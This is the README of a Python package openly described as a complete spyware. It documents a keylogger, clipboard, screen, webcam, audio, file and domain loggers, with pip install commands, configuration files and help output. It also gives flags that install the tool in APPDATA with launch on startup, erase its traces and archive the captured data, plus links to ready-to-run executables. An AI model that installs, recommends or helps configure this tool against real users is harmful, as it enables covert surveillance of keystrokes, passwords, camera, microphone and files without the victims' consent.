![SpyWare logo](https://mauricelambert.github.io/info/python/security/SpyWare_small.png "SpyWare logo")

# SpyWare

## Description

This package implements a complete spyware.

Features:

 - KeyLogger
 - ClipboardLogger
 - Domains/IP logger
 - Webcam spy
 - Screen spy
 - Files logger
 - Recorder

## Requirements

This package require:

 - python3
 - python3 Standard Library
 - pyautogui
 - opencv-python
 - pillow
 - pyperclip
 - pynput
 - pyaudio

## Installation

```bash
pip install SpyWare
```

## Usages

### Command line

```bash
SpyWare                             # Run all modules
SpyWare runonly -s                  # Run only screen module
SpyWare runonly --screen --key      # Run only screen module and keylogger
SpyWare runonly --key my.conf       # Run only module key with custom configuration file
SpyWare --install                   # Install spyware in random destination, enable it and run all modules
SpyWare --enable                    # Enable the SpyWare (start on reboot)
SpyWare --env "keySpy.conf=my.conf" # Add an environment variable (this defined the name of the custom configuration file for the keylogger)
SpyWare donotrun --domains --webcam # Run all modules except domains and webcam

# Following arguments are executed on python exit
# To stop the spyware you should raise a KeyboardInterrupt (Ctrl-C in the terminal)
# Is not working on OS shutdown or process kill
SpyWare --remove                    # Remove all files generated by the SpyWare and the SpyWare (the executable file only)
SpyWare --tar                       # Add data generated by the SpyWare in a .tar archive
SpyWare --tar "gz"                  # Add data generated by the SpyWare in a .tar.gz archive (compressed)
```

### Python executables

```bash
python3 WebcamLogger.pyz                  # Execute the webcam module
python3 WebcamLogger.pyz my.conf          # Execute the webcam module with custom configuration file
# OR
chmod u+x AudioLogger.pyz                 # Add execution permission
./AudioLogger.pyz my.conf                 # Execute the audio (recorder) module

python3 SpyWare.pyz runonly --files       # Run only the files modules
# OR
chmod u+x SpyWare.pyz                     # Add execution permission
./SpyWare.pyz donotrun --clipboard --key  # Run all modules except clipboard module and keylogger
```

### Python module

```bash
python3 -m SpyWare                             # Run all modules
python3 -m SpyWare.AudioLogger                 # Run only one module
python3 -m SpyWare.WebcamLogger my.conf        # Run only one module with custom configuration file
python3 -m SpyWare.FilesLogger.FilesLogger     # Run only one module
python3 -m SpyWare.KeyLogger.KeyLogger my.conf # Run only one module with custom configuration file
```

### Python script

```python
from SpyWare import spyware
spyware()                    # Run all modules
```

```python
from SpyWare import AudioLogger
from SpyWare.KeyLogger import keySpy
AudioLogger.audioSpy()       # Run audio (recorder) module
keySpy(filename="my.conf")   # Run keylogger with custom configuration file
```

There are three way to change the configuration filename:
 1. Using the *filename* argument of the *configuration loader* function
 2. Using environment variables (in python: `os.environ`). The name of the environment variable is the filename of the default configuration file.
 3. Using command line arguments

Examples available in HTML documentation of modules.

```python
from SpyWare.FilesLogger import Daemon, filesConfig
filesConfig("my.conf")       # Load configuration
Daemon().run_for_ever()      # Start the daemon thread of "files" module
```

```python
from SpyWare.ClipboardLogger import Daemon, copyConfig

from os import environ
environ["clipboardSpy.conf"] = "my.conf" # Change the environment variable

copyConfig()                             # Load configuration

daemon = Daemon()
daemon.run_for_ever()                    # Start the daemon thread of clipboard module
```

```python
from SpyWare.ScreenLogger import Daemon, screenConfig

screenConfig(argv=["_", "my.conf"])      # Use custom argv to load configuration

daemon = Daemon()
daemon.run_for_ever()                    # Start the daemon thread of screen module
```

## Default configurations

### Clipboard

```ini
[SAVE]
filename = clipboard.txt

[TIME]
check_internval = 11
```

### Recorder

```ini
[SAVE]
filename = record*.wav
dirname = records

[TIME]
interval = 3590
record_time = 10
```

### Domains

```ini
[SAVE]
filename = domains.txt

[TIME]
interval_dns = 60
interval_appdata = 86400
interval_reading_file = 0.5
interval_domain = 0.05
```

### Fileslogger

```ini
[SAVE]
filename = files.csv

[TIME]
file_interval = 0.1
directory_interval = 1
scan_interval = 86400
```

### Keylogger

```ini
[SAVE]
filename = keySpy.txt
event_press = 0
event_release = 0
hot_keys = 1
event_time = 1

[TIME]
```

### Screenshot

```ini
[SAVE]
filename = screenshot*.png
dirname = screenshots

[TIME]
screenshot_interval = 3600
```

### Webcam

```ini
[SAVE]
filename = webcam*.png
dirname = pictures

[TIME]
picture_interval = 3600
```

## Helps

```text
~# SpyWare --help

SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

usage: SpyWare.pyz [-h] [--env [ENV ...]] [--install] [--enable] [--remove] [--tar [{bz2,xz,gz}]] {runonly,donotrun} ...

This file implements a complete spyware.

positional arguments:
  {runonly,donotrun}    Modules selection type.
    runonly             Run only specified modules.
    donotrun            Do not run specified modules.

optional arguments:
  -h, --help            show this help message and exit
  --env [ENV ...], -e [ENV ...]
                        Add environment variable, values should be formatted as <key>=<value>
  --install, -i         Install the spyware in APPDATA and enabled it (launch on startup)
  --enable, -E          Enable the spyware (launch it on startup)
  --remove, -r          Remove spyware trace (executable/script, links and data)
  --tar [{bz2,xz,gz}], -t [{bz2,xz,gz}]
                        Build a tar file with data, optional value should be 'gz', 'xz', 'bz2' to compress.
```

```text
~# SpyWare --help

SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

usage: SpyWare.pyz runonly [-h] [--audio [AUDIO]] [--clipboard [CLIPBOARD]] [--domains [DOMAINS]] [--files [FILES]] [--key [KEY]] [--screen [SCREEN]] [--webcam [WEBCAM]]

optional arguments:
  -h, --help            show this help message and exit

modules:
  SpyWare modules to launch in this process.

  --audio [AUDIO], -a [AUDIO]
                        Run module audio with optional value as configuration file (default=audioSpy.conf).
  --clipboard [CLIPBOARD], -c [CLIPBOARD]
                        Run module clipboard with optional value as configuration file (default=clipboardSpy.conf).
  --domains [DOMAINS], -d [DOMAINS]
                        Run module domains with optional value as configuration file (default=domainsSpy.conf).
  --files [FILES], -f [FILES]
                        Run module files with optional value as configuration file (default=filesSpy.conf).
  --key [KEY], -k [KEY]
                        Run module key with optional value as configuration file (default=keySpy.conf).
  --screen [SCREEN], -s [SCREEN]
                        Run module screen with optional value as configuration file (default=screenSpy.conf).
  --webcam [WEBCAM], -w [WEBCAM]
                        Run module webcam with optional value as configuration file (default=webcamSpy.conf).
```

```text
~# SpyWare --help

SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

usage: SpyWare.pyz donotrun [-h] [--audio] [--clipboard] [--domains] [--files] [--key] [--screen] [--webcam]

optional arguments:
  -h, --help       show this help message and exit

modules:
  SpyWare modules to not launch in this process.

  --audio, -a      Do not run module audio.
  --clipboard, -c  Do not run module clipboard.
  --domains, -d    Do not run module domains.
  --files, -f      Do not run module files.
  --key, -k        Do not run module key.
  --screen, -s     Do not run module screen.
  --webcam, -w     Do not run module webcam.
```

## Links

 - [Github Page](https://github.com/mauricelambert/SpyWare)
 - [Documentation](https://mauricelambert.github.io/info/python/security/SpyWare.html)
 - [Documentation Clipboard](https://mauricelambert.github.io/info/python/security/SpyWare/ClipboardLogger.html)
 - [Documentation Screenshot](https://mauricelambert.github.io/info/python/security/SpyWare/ScreenLogger.html)
 - [Documentation Domains](https://mauricelambert.github.io/info/python/security/SpyWare/DomainsLogger.html)
 - [Documentation Recorder](https://mauricelambert.github.io/info/python/security/SpyWare/AudioLogger.html)
 - [Documentation Keylogger](https://mauricelambert.github.io/info/python/security/SpyWare/KeyLogger.html)
 - [Documentation Webcam](https://mauricelambert.github.io/info/python/security/SpyWare/WebcamLogger.html)
 - [Documentation Files](https://mauricelambert.github.io/info/python/security/SpyWare/FilesLogger.html)
 - [Download as python executable](https://mauricelambert.github.io/info/python/security/SpyWare.pyz)
 - [Download Clipboard as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/ClipboardLogger.pyz)
 - [Download Screenshot as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/ScreenLogger.pyz)
 - [Download Domains as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/DomainsLogger.pyz)
 - [Download Recorder as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/AudioLogger.pyz)
 - [Download Keylogger as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/Keylogger.pyz)
 - [Download Webcam as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/WebcamLogger.pyz)
 - [Download Files as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/FilesLogger.pyz)
 - [Pypi package](https://pypi.org/project/SpyWare/)

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
